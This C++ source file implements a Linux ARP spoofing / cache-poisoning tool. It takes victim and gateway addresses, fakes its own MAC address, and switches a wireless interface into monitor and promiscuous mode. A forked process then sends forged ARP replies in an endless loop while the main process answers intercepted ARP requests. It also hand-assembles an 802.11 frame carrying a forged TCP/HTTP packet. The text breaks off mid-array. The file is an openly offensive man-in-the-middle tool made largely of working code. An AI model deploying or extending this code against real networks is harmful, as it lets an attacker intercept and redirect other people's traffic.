/* 
 *
*/

// Headers
#include <cstdlib>
#include <cstdio>
#include <iostream>
#include <cstring>
#include <csignal>
#include <cerrno>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <linux/wireless.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <poll.h>
#include <cassert>

// Defines
#define IP_ALEN 4
#define IP_PRES 15 // 12 numbers + 3 decimals
#define PROMISCFILTER
#define RING_FRAMES 128                                     // number of frames in ring
#define PKT_OFFSET  (TPACKET_ALIGN(sizeof(tpacket_hdr)) + \
                     TPACKET_ALIGN(sizeof(sockaddr_ll)))    // packet offset

// Incase glibc 2.1
#ifndef SOL_PACKET
#define SOL_PACKET 263
#endif

// QDisk Bypass, >= 3.14
#ifndef PACKET_QDISC_BYPASS
#define PACKET_QDISC_BYPASS 20
#endif

// ANSI Excape Macros
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define NF      "\033[0m"
#define CLRLN   "\033[2K"
#define CUP     "\033[1A"
#define CLRSCRN "\033[2J\033[1;1H"

// Global Structs
typedef struct {
    __be16        ar_hrd,
                  ar_pro;
    unsigned char ar_hln,
                  ar_pln;
    __be16        ar_op;

    // Usually #if 0 Out
    unsigned char ar_sha[ETH_ALEN],
                  ar_sip[IP_ALEN],
                  ar_tha[ETH_ALEN],
                  ar_tip[IP_ALEN];
}__attribute__((__packed__)) arp_hdr;

// Berkley Packet Filter Assembley
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// Filter All Packets
struct sock_filter promiscfilter[] = {
    BPF_STMT(BPF_RET, ETH_FRAME_LEN)                              // return ethernet frame
};

// Filter MAC Broadcast And Unicast Packets
struct sock_filter macfilter[] = {                                
    BPF_STMT(BPF_LD  + BPF_W    + BPF_ABS, 2),                    // A <- P[2:4]
    BPF_JUMP(BPF_JMP + BPF_JEQ  + BPF_K,   0xffffffff, 0, 2),     // if A != broadcast GOTO LABEL
    BPF_STMT(BPF_LD  + BPF_H    + BPF_ABS, 0),                    // A <- P[0:2]
    BPF_JUMP(BPF_JMP + BPF_JEQ  + BPF_K,   0x0000ffff, 2, 0),     // if A == 0xffff     GOTO ACCEPT
    // LABEL
    BPF_STMT(BPF_LD  + BPF_B    + BPF_ABS, 0),                    // A <- P[0:1]
    BPF_JUMP(BPF_JMP + BPF_JSET + BPF_K,   0x01,       0, 1),     // if !(A & 1)        GOTO REJECT
    // ACCEPT
    BPF_STMT(BPF_RET, ETH_FRAME_LEN),                             // accept packet, size of ethernet frame
    // REJECT
    BPF_STMT(BPF_RET, 0),                                         // drop packet, return null
};

// Filter ARP Frames
struct sock_filter arpfilter[] = {
    BPF_STMT(BPF_LD  + BPF_H   + BPF_ABS, 12),                    // skip 12 bytes into frame offset for hwr addr
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K,   ETH_P_ARP, 0, 1),       // eth hardware addr != ARP skip next instruc
    BPF_STMT(BPF_RET + BPF_K,    sizeof(ethhdr)+sizeof(arp_hdr)), // size of ARP frame
    BPF_STMT(BPF_RET + BPF_K,    0),                              // return ARP frame or null
};
//<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// Static Globals
static const std::size_t PSIZE       = sizeof(ethhdr) + sizeof(arp_hdr);
static volatile sig_atomic_t sigCond = 0;                     // signal condition variable
static const long pagesize           = sysconf(_SC_PAGESIZE); // pagesize
static int rxring_offset             = 0;                     // rx ring offset
static int txring_offset             = 0;                     // tx ring offset

// Function Prototypes
static void sighand      (int sig, siginfo_t* si, void* ucontext) {} // signal handler
static int  rfmon_up     (const char* const ifc, int sfd, ifreq old_ifr, iwreq old_iwr);
static int  rfmon_down   (const char* const ifc, int sfd, ifreq old_ifr, iwreq old_iwr);
static int  promisc_up   (const char* const ifc, int sfd);
static int  promisc_down (const char* const ifc, int sfd);
static int  map_destruct (unsigned char *&ring);
static int  attach_filter(const char* const ifc, const unsigned char* const smac, int sfd);
static int  send_arp     (const char* const ifc,
                          const unsigned char* const sha, const unsigned char* const sip,
                          const unsigned char* const tha, const unsigned char* const tip,
                          const bool opcode, const bool verbose,
                          unsigned char *&ring, int sfd, tpacket_req3 treq);
static void* process_rx  (unsigned char *&ring, int sfd);
static void* process_tx  (unsigned char *&ring, int sfd, tpacket_req3 treq);
static void  rx_release  (unsigned char *&ring);
static void  tx_release  (unsigned char *&ring, const unsigned len, tpacket_req3 treq);

// Main
int main(int argc, char **argv) {
    // Check Args
    if(argc < 6 || !std::strncmp(argv[1], "-h", std::strlen("-h") + 1)) {
        std::cerr << "\nUsage: " << argv[0] << " [interface] [victim-ip] [gate-ip] [victim-mac] [gate-mac]\n\n";
        return EXIT_FAILURE;
    }

    // Chec CAP_NET_RAW Root
    if(geteuid() || getuid()) {
        printf("\nMust be root!\n\n");
        return EXIT_FAILURE;
    }

    // Declarations
    unsigned char V_ip[IP_ALEN], S_ip[IP_ALEN],  V_mac [ETH_ALEN], S_mac[ETH_ALEN],
                  sip [IP_ALEN], smac[ETH_ALEN], packet[PSIZE], bcast[ETH_ALEN];
    sockaddr_in   sinS, sinV;
    sockaddr_ll   sll;
    ifreq         ifr, old_ifr;
    iwreq         iwr, old_iwr;
    tpacket_req3  treq;
    unsigned char       *ring       = NULL;
    const char* const    IFACE      = argv[1];
    const unsigned char  macBCast[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
    const bool           vFlag_1    = false,
                         vFlag_2    = true;
    const unsigned       opFlag1    = 1,
                         opFlag2    = 1;

    // Zero Out
    std::memset(V_ip,  0, IP_ALEN);
    std::memset(S_ip,  0, IP_ALEN);
    std::memset(V_mac, 0, ETH_ALEN);
    std::memset(S_mac, 0, ETH_ALEN);
    std::memset(sip,   0, IP_ALEN);
    std::memset(smac,  0, ETH_ALEN);
    std::memset(bcast, 0, ETH_ALEN);
    std::memset(&sll,  0, sizeof(sll));
    std::memset(&ifr,  0, sizeof(ifr));
    std::memset(&iwr,  0, sizeof(iwr));
    std::memset(&treq, 0, sizeof(treq));

    // Copy In Args
    inet_aton(argv[2], &sinV.sin_addr);
    inet_aton(argv[3], &sinS.sin_addr);
    std::memcpy(V_ip, &sinV.sin_addr, IP_ALEN);
    std::memcpy(S_ip, &sinS.sin_addr, IP_ALEN);
    std::memcpy((void*)V_mac, (const void*)ether_aton(argv[4]), ETH_ALEN);
    std::memcpy((void*)S_mac, (const void*)ether_aton(argv[5]), ETH_ALEN);

    // Create RAW Socket
    int sfd = 0;
    if((sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        std::perror("socket");
        return false;
    }
    
    // Get Hardware Address
    std::strncpy(ifr.ifr_name, "wlan0", IFNAMSIZ); // copy in interface device   
    if(ioctl(sfd, SIOCGIFHWADDR, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFHWADDR");
        return false;
    }

    // Spoof Our Hardware(MAC) Adrress
    ++ifr.ifr_hwaddr.sa_data[0]; ++ifr.ifr_hwaddr.sa_data[1]; 
    ++ifr.ifr_hwaddr.sa_data[2]; ++ifr.ifr_hwaddr.sa_data[3];
    ++ifr.ifr_hwaddr.sa_data[4]; ++ifr.ifr_hwaddr.sa_data[5];
    std::memcpy(smac, &ifr.ifr_hwaddr.sa_data, ETH_ALEN); // copy in
    
    // Get Interface Index
    std::strncpy(ifr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return false;
    }

    // Set Up Socket Link-Layer Address
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    sll.sll_pkttype  = PACKET_OTHERHOST;
    sll.sll_halen    = ETH_ALEN;
    std::memcpy(&sll.sll_addr, smac, ETH_ALEN); // copy in

    // Bind RAW Socket
    //if(bind(sfd, (sockaddr*)&sll, sizeof(sll))) {
      //  std::perror("bind");
        //return false;
    //}

    // Save Current Interface Mode 
    std::strncpy(old_iwr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIWMODE, &old_iwr) == -1) {
        std::perror("ioctl - SIOCGIWMODE");
        return false;
    }

    // Get Current Interface Flags
    std::strncpy(ifr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("ioctl - SIOCGIFFLAGS");
	    return false;
	}

    // Save Current Interface Flags
    old_ifr.ifr_flags = ifr.ifr_flags;

    // Check If Curent Interface Is Up
    if(!(ifr.ifr_flags & IFF_UP & IFF_BROADCAST & IFF_RUNNING)) {
        // Or In Up, Broadcast, Running
        ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING;

        // Set Interface Flags   
        if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
            std::perror("ioctl - SIOCSIFFLAGS");
            return false;
        }
    }
    
    /*// Bypass QDisk Layer, >= linux 3.14
    int val = 1;
	if(setsockopt(sfd, SOL_PACKET, PACKET_QDISC_BYPASS, &val, sizeof(val))) {
        std::perror("setsockopt - PACKET_QDISC_BYPASS");
        return false;
    }*/

    // Set Up Time Outs
    timeval receive_timeout;
    receive_timeout.tv_sec  = 0;
    receive_timeout.tv_usec = 60; // microseconds
    if(setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, &receive_timeout, sizeof(receive_timeout))) {
        std::perror("setsockopt - SO_RCVTIMEO");
        return false;
    }

    // Set Packet Version
    int v = TPACKET_V2;
    if(setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &v, sizeof(v))) {
        std::perror("setsockopt - PACKET_VERSION");
        return false;
    }

    // Set Up Packet Fanout Load Balancing
    int fanout_id   = getpid() & 0xffff,
        fanout_type = PACKET_FANOUT_HASH, // or use PACKET_FANOUT_LB
        fanout_arg  = fanout_id | (fanout_type << 16);
	if(setsockopt(sfd, SOL_PACKET, PACKET_FANOUT, &fanout_arg, sizeof(fanout_arg))) {
	    std::perror("setsockopt - PACKET_FANOUT");
		return false;
	}
   
    // Set Up Receiving Ring Sizes, Used For Both RX And TX
    treq.tp_block_size       = RING_FRAMES * getpagesize();
    treq.tp_block_nr         = 1;   
    treq.tp_frame_size       = getpagesize();
    treq.tp_frame_nr         = RING_FRAMES;
    treq.tp_retire_blk_tov   = 60;                    // 60 millisecond wait, V3
    treq.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH; // fill via skbuffs packet hash, V3

    // Sanity Check Our Frames And Blocks
    if((treq.tp_frame_size <= TPACKET2_HDRLEN) || (treq.tp_frame_size % TPACKET_ALIGNMENT)
                                               || (treq.tp_block_size % treq.tp_frame_size)) {
        std::cerr << "\nSanity Checks";
        return false;
    }
    
    // Attach Packet Rings
    if(setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, &treq, sizeof(treq)) == -1) { // RX
        std::perror("setsockopt - PACKET_RX_RING");
        return false;
    }
    if(setsockopt(sfd, SOL_PACKET, PACKET_TX_RING, &treq, sizeof(treq)) == -1) { // TX
        std::perror("setsockopt - PACKET_RX_RING");
        return false;
    }

    // Memory Map For Semi-Zero Copy, RX And TX Will Be Asymetric
    if((ring = (unsigned char*)mmap(NULL, ((treq.tp_block_size * treq.tp_block_nr) * 2), // times 2, both RX and TX
                                    PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0)) == MAP_FAILED) {
        std::perror("mmap");
        return false;
    }
  
    // Set Up Monitor Mode
    if(rfmon_up(IFACE, sfd, old_ifr, old_iwr))
        return false;

    // Set Promiscous Mode
    if(promisc_up(IFACE, sfd))
        return false;

    // Set Up Filter
    if(attach_filter(IFACE, smac, sfd))
        return EXIT_FAILURE;

    // Set Up Signal Handler
    struct sigaction sa;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags     = 0;
    sa.sa_sigaction = sighand;

    if(sigaction(SIGINT,  &sa, NULL) == -1) { // SIGINT
        std::perror("sigaction - SIGINT");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGQUIT, &sa, NULL) == -1) { // SIGQUIT
        std::perror("sigaction - SIGQUIT");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGCHLD, &sa, NULL) == -1) { // SIGCHLD
        std::perror("sigaction - SIGCHLD");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGHUP,  &sa, NULL) == -1) { // SIGHUP
            std::perror("sigaction");
            return EXIT_FAILURE;
    }

    // Verbose
    std::printf("\nSpoofed MAC Address: %s%02x:%02x:%02x:%02x:%02x:%02x%s\n\n",
        GREEN, smac[0], smac[1], smac[2], smac[3], smac[4], smac[5], NF);

    // Fork Program Flow
    pid_t cpid = fork();
    switch(cpid) {
        // Error
        case -1:
            std::perror("fork()");
            return EXIT_FAILURE;
        // Child
        case 0:
            // Infinite Loop, ARP Cache Poisoning
            for(;;) {
                //send_arp(IFACE, smac, S_ip, V_mac, V_ip, opFlag1, vFlag_1); // S to V
                send_arp(IFACE, smac, V_ip, S_mac, S_ip, opFlag1, vFlag_1, ring, sfd, treq); // V to S
              //usleep(400000);                                             // slow down poisoning
            }

            // Shouldn't Get Here
            exit(EXIT_FAILURE);
        // Parent
        default:
            break;
    }
            
    // Infinite Loop Redirection, ARP Spoofing
    for(;;) { // Sniff ARP Frames (blocks)
        // Grab Packet
        tpacket_hdr *packet = (tpacket_hdr*)process_rx(ring, sfd);
            if(!packet) // received signal interuption
                break;

        // Set Headers
        ethhdr  *eth = (ethhdr*) ((uint8_t*)packet + packet->tp_mac);
        arp_hdr *arp = (arp_hdr*)((uint8_t*)eth    + sizeof(ethhdr));

        // Process Packet, Check ARP Frame
        if(eth->h_proto == htons(ETH_P_ARP)                                         && // arp
            ((!std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_tip), argv[2], IP_PRES)   && // S to V
               std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_sip), argv[3], IP_PRES))  ||
             (!std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_tip), argv[3], IP_PRES)   && // V to S
              !std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_sip), argv[2], IP_PRES))) && 
              *arp->ar_sha != *smac)                                                   // not our mac
                    send_arp(IFACE, smac, arp->ar_tip, arp->ar_sha, arp->ar_sip, opFlag2, vFlag_2, ring, sfd, treq);

            // Release Packet
            rx_release(ring);
    }

    // Clean Up
    std::cout << "\nCleaning Up...";
    std::fflush(stdout); // flush
    
    // Sure Kill Child
    if(kill(cpid, SIGKILL)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("kill");
        return EXIT_FAILURE;
    }

    /*/ Unset Monitor Mode
    if(rfmon_down(IFACE, sfd, old_ifr, old_iwr)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }*/

    // Unset Promiscous Mode
    if(promisc_down(IFACE, sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }

    // Destrust Ring Map
    if(map_destruct(ring)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }
    
    // CLose Socket
    if(close(sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("close");
        return EXIT_FAILURE;
    }

    // Verbose
    sleep(1);                                     // sleep for verbose
    std::cout << " [" << GREEN "OK" << NF << ']';
    std::fflush(stdout);                          // flush
    sleep(1);                                     // sleep for verbose

    // Success
    std::cout << "\n\nGood-Bye!\n\n";
    return EXIT_SUCCESS;
}

// Function Implementations
int rfmon_up(const char* const ifc, int sfd, ifreq old_ifr, iwreq old_iwr) {
    // Declarations
    ifreq ifr;
    iwreq iwr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&iwr, 0, sizeof(iwr));

    // Set Interface Down, ifr_flags = 0 from memset
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) { // set flags
        std::perror("rfmon_up: ioctl - SIOCSIFFLAGS-1");
        return -1;
    }

    // Get Mode
    std::strncpy(iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIWMODE, &iwr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCGIWMODE");
        return -1;
    }
 
    // Set Interface Mode
    std::strncpy(old_iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    iwr.u.mode = IW_MODE_MONITOR;                  // set monitor mode
    if(ioctl(sfd, SIOCSIWMODE, &iwr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCSIWMODE");
        return -1;
    }

    // Bring Interface Up
    ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING; // OR in up, broadcast, running

    // Set Interface Flags
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCSIFFLAGS-2");
        return -1;
    }

    // Success
    return 0;
}

int rfmon_down(const char* const ifc, int sfd, ifreq old_ifr, iwreq old_iwr) {
    // Declarations
    ifreq ifr;
    iwreq iwr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&iwr, 0, sizeof(iwr));   
    
    // Set Interface Down, ifr_flags = 0 from memset
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ);     // copy in interface device
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {     // set flags
        std::perror("rfmon_down: ioctl - SIOCSIFFLAGS-1");
        return -1;
    }

    // Set Interface Mode
    std::strncpy(old_iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    old_iwr.u.mode = IW_MODE_INFRA;                // not set, set managed mode
    if(ioctl(sfd, SIOCSIWMODE, &old_iwr) == -1) {
        std::perror("rfmon_down: ioctl - SIOCSIWMODE");
        return -1;
    }

    // Bring Interface Up
    old_ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING; // OR in up, broadcast, running

    // Set Interface Up
    std::strncpy(old_ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCSIFFLAGS, &old_ifr) == -1) {
        std::perror("rfmon_down: ioctl - SIOCSIFFLAGS-2");
        return false;
    }

    // Success
    return 0;
}

int promisc_up(const char* const ifc, int sfd) {
    // Declarations
    ifreq ifr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));

    // Get Interface Flags
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("promisc_up: ioctl - SIOCGIFFLAGS");
	    return -1;
	}

    // OR In Promiscuous
    if(ifr.ifr_flags & IFF_PROMISC)   // check if set
        return 0;                     // already set
    else
        ifr.ifr_flags |= IFF_PROMISC; // not set, set promsicuous

    // Set Interface Flags   
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("promisc_up: ioctl - SIOCSIFFLAGS");
        return -1;
    }

    // Success
    return 0;
}

int promisc_down(const char* const ifc, int sfd) {
    // Declarations
    ifreq ifr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
     
    // Get Interface Flags
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("promisc_down: ioctl - SIOCGIFFLAGS");
	    return -1;
	}

    // AND Out Promiscuous
    if(ifr.ifr_flags & IFF_PROMISC)    // check if set
        ifr.ifr_flags &= ~IFF_PROMISC; // unset promiscuous
    else
        return 0;                      // already set

    // Set Interface Flags
	if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("promisc_down: ioctl - SIOCSIFFLAGS");
        return -1;
    }

    // Success
    return 0;
}

int map_destruct(unsigned char *&ring) {
    // Unmap Memory
    if(munmap(ring, RING_FRAMES * getpagesize())) {
        std::perror("munmap");
        return -1;
    }

    // Success
    return 0;
}

int attach_filter(const char* const ifc, const unsigned char* const smac, int sfd) {
   // Declarations
    sock_fprog  fprog;
    sock_filter *s_filter = NULL;
    
    // Zero Out
    std::memset(&fprog, 0, sizeof(fprog));

// Promiscous Filtering
#ifdef PROMISCFILTER
    // Allocate Filter
    if(!(s_filter = (sock_filter*)std::malloc(sizeof(promiscfilter)))) {
        std::perror("malloc");
        return -1;
    }

    // Copy In
    std::memcpy(s_filter, &promiscfilter, sizeof(promiscfilter));

    // Initialize
    fprog.filter = s_filter;
    fprog.len    = sizeof(promiscfilter)/sizeof(sock_filter);

// MAC Address Filtering
#else
    // Allocate Filter
    if(!(s_filter = (sock_filter*)std::malloc(sizeof(macfilter)))) {
        std::perror("malloc");
        return -1;
    }
    
    // Copy In
    std::memcpy(s_filter, &macfilter, sizeof(macfilter));

    // Adjust For Fake MAC Address
    s_filter[1].k = (smac[2] & 0xff) << 24 |
                    (smac[3] & 0xff) << 16 |
                    (smac[4] & 0xff) << 8  |
                    (smac[5] & 0xff);
    s_filter[3].k = (smac[0] & 0xff) << 8  |
                    (smac[1] & 0xff);

    // Initialize
    fprog.filter = s_filter;
    fprog.len    = sizeof(macfilter)/sizeof(sock_filter);
#endif

    // Attach Linux Packet Filter
    if(setsockopt(sfd, SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog)) == -1) {
        std::perror("attach_filter: setsockopt - SO_ATTACH_FILTER");
        return -1;
    }

    // Success
    return 0;
}

int send_arp(const char* const ifc,
             const unsigned char* const sha, const unsigned char* const sip,
             const unsigned char* const tha, const unsigned char* const tip,
             const bool opcode, const bool verbose,
             unsigned char *&ring, int sfd, tpacket_req3 treq) {
    // Declarations
    unsigned char  arpPacket[PSIZE];
    ethhdr        *ethSpoof = (ethhdr*)  arpPacket;
    arp_hdr       *arpSpoof = (arp_hdr*)(arpPacket + sizeof(ethhdr));
    ifreq          ifr;
    sockaddr_ll    destll;

    // Zero Out
    std::memset(&ifr,    0, sizeof(ifr));
    std::memset(&destll, 0, sizeof(destll));   

    // Create RAW Socket
    int sfdC = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if(sfdC == -1) {
        std::perror("socket");
        return -1;
    }
    
    // Copy In Interface Device
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ);

    // Get Interface Flags
    if((ioctl(sfdC, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("createSniffer: ioctl - SIOCGIFFLAGS");
	    return false;
	}

    // Check If Interface Is Up
    if(!(ifr.ifr_flags & IFF_UP & IFF_BROADCAST & IFF_RUNNING)) {
        // Or In Up, Broadcast, Running
        ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING;

        // Set Interface Flags   
        if(ioctl(sfdC, SIOCSIFFLAGS, &ifr) == -1) {
            std::perror("ioctl - SIOCSIFFLAGS");
            return false;
        }
    }

    // Create Ethernet Header
    std::memcpy(ethSpoof->h_source, sha, ETH_ALEN);
    std::memcpy(ethSpoof->h_dest,   tha, ETH_ALEN);   
    ethSpoof->h_proto = htons(ETH_P_ARP);

    // Create ARP Header
    arpSpoof->ar_hrd = htons(ARPHRD_ETHER);
    arpSpoof->ar_pro = htons(ETH_P_IP);
    arpSpoof->ar_hln = ETH_ALEN;
    arpSpoof->ar_pln = IP_ALEN;

    // Process Opcode
    unsigned char op;
    if(opcode) {
        arpSpoof->ar_op = htons(ARPOP_REPLY);
        op = 0x01;
    }
    else {
        arpSpoof->ar_op = htons(ARPOP_REQUEST);
        op = 0x2;
    }
    
    std::memcpy(arpSpoof->ar_sha, sha, ETH_ALEN);
    std::memcpy(arpSpoof->ar_sip, sip, IP_ALEN);
    std::memcpy(arpSpoof->ar_tha, tha, ETH_ALEN);
    std::memcpy(arpSpoof->ar_tip, tip, IP_ALEN);

    // Get Interface Index
    if(ioctl(sfdC, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    destll.sll_ifindex  = ifr.ifr_ifindex;
    destll.sll_family   = AF_PACKET;
    destll.sll_protocol = htons(ETH_P_802_2);
    destll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    destll.sll_pkttype  = PACKET_OTHERHOST;
    destll.sll_halen    = ETH_ALEN;
    std::memcpy(&destll.sll_addr, sha, ETH_ALEN);
    
    const unsigned char packet[] = {
        /*// TPacketV2
        0x00, 0x00, 0x00, 0x00, // status
        0x26, 0x00, 0x00, 0x00, // len
        0x26, 0x00, 0x00, 0x00, // snaplen
        0x50, 0x00, // mac
        0x50, 0x00, // net
        0x78, 0x0E, 0xC4, 0x54, // sec
        0xC8, 0xFB, 0xAA, 0x10, // nsec
        0x00, 0x00, // vlan_tci
        0x00, 0x00, // vlan_tpid

        // TPacketV2 16-Byte Bound
        0x00, 0x00, 0x00, 0x00,*/
        
        // SLL
        0x11, 0x00, // family
        0x00, 0x04, // proto
        0x04, 0x00, 0x00, 0x00, // if_index
        0x23, 0x03, // ha_type
        0x03, // pkt_type
        0x06, // ha_len
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr
        
        // SLL 16-Byte Bound Pad
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        // TPacketV2 + SLL 16-Byte Bound
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        
        // Radiotap
        //0x00, // version
        //0x00, // pad
        //0x0B, 0x00, // length 
        //0x04, 0x80, 0x02, 0x00, // preset bitmap
        //0x6C, // rate
        //0x00, // tx_pwr
        //0x00, // antenna
        
        // Radiotap
        0x00, // version
        0x00, // pad
        0x19, 0x00, // len
        0x2F, 0x08, 0x08, 0x00, // present bitmap
        0xF5, 0x5B, 0xB4, 0xC8, 0x00, 0x00, 0x00, 0x00, // tsft
        0x10, // flags
        0x6C, // rate
        0x9E, 0x09, // channel
        0x80, 0x04, // channel flags
        0xDD, // antsignal
        0x00, // antnoise
        0x00, // antenna index
    
        // ieee80211, 3 addr
        0x08, 0x01, // frame control bitmap
        0x00, 0x00, // duration                                                tods bssid,sa,da 0x01
        0x00, 0x26, 0x88, 0xEA, 0x84, 0x08, // addr1 bssid                     fromds da,sa,bssid 0x02
        sha[0], sha[1], sha[2], sha[3], sha[4], sha[5], // addr2 sa
        tha[0], tha[1], tha[2], tha[3], tha[4], tha[5], // addr3 da
        0x00, 0x00, // seq_ctrl
        
        // LLC
        0xAA, // dsap
        0xAA, // lsap
        0x03, // ctrl1
        
        // SNAP
        0x00, 0x00, 0x00, // oui
        0x08, 0x00, // ether_type
        
        /*// ARP
        0x00, 0x01, // ha_type
        0x08, 0x00, // ether_type
        0x06, // ha_len
        0x04, // ether_len
        0x00, op, // opcode
        sha[0], sha[1], sha[2], sha[3], sha[4], sha[5], // sha
        sip[0], sip[1], sip[2], sip[3], // sip
        tha[0], tha[1], tha[2], tha[3], tha[4], tha[5], // tha
        tip[0], tip[1], tip[2], tip[3], // tip*/

        // IP
        0x45, // ihl + version
        0x00, //tos
        0x02, 0x26, // total len
        0xEB, 0xE2, // id
        0x40, 0x06, // frag off
        0x40, // ttl(hops)
        0x06, // protocol
        0xDE, 0x83, // checksum
        sip[0], sip[1], sip[2], sip[3], // saddr
        tip[0], tip[1], tip[2], tip[3], // daddr

        // TCP
        0x96, 0x01, // sport
        0x00, 0x50, // dport
        0x49, 0xC6, 0x36, 0xEC, // seq
        0x34, 0xEF, 0x75, 0x65, // ack_seq
        0x80, 0x18, // flags bitmap
        0x00, 0x1D, // window
        0xE3, 0x01, // checksum
        0x00, 0x00, // urg_ptr
        0x01, 0x01, 0x08, 0x0A, 0x00, 0x04, 0xDD, 0x19, 0x29, 0x9B, 0xAB, 0x39, // options
        
        // HTTP
        'G','E','T',' ',
        'h','t','t','p',':','/','/','j','a','m','b','a','s','e','.','c','o','m','/',' ',
        'H','T','T','P','/','1','.','1',
        0x0D, 0x0A, // get

        'H','o','s','t',':',' ',
        'j','a','m','b','a','s','e','.','c','o','m',':','8','0',
        0x0D, 0x0A, // host

        'U','s','e','r','-','A','g','e','n','t',':',' ',
        'M','o','z','i','l','l','a','/','5','.','0',' ',
        '(','X','1','1',';',' ','L','i','n','u','x',' ','x','8','6','_','6','4',';',' ',
        'r','v',':','2','2','.','0',')',' ',
        'G','e','c','k','o','/','2','0','1','0','0','1','0','1',' ',
        'F','i','r','e','f','o','x','/','2','2','.','0',' ',
        'I','c','e','w','e','a','s','e','l','/','2','2','.','0',
        0x0D, 0x0A, // user-agent

        'A','c','c','e','p','t',':',' ',
        't','e','x','t','/',
        'h','t','m','l',',',
        'a','p','p','l','i','c','a','t','i','o','n','/',
        'x','h','t','m','l','+',
        'x','m','l',',',
        'a','p','p','l','i','c','a','t','i','o','n','/',
        'x','m','l',';',
        'q','=','0','.','9',',',
        '*','/','*',';',
